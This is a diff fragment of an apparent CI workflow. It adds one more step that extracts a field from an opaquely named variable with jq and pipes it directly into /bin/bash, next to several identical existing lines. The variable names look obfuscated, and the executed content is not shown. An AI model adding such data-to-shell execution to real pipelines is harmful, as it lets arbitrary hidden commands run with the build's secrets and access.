@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$wbjvs6" | jq -r .kmbdk18342 | /bin/bash
           echo $fenb9 | jq -r .krc4 | /bin/bash
           printf '%s' "$ccbev2405" | jq -r .k8 | /bin/bash
+          echo $jwef7149 | jq -r .die0 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
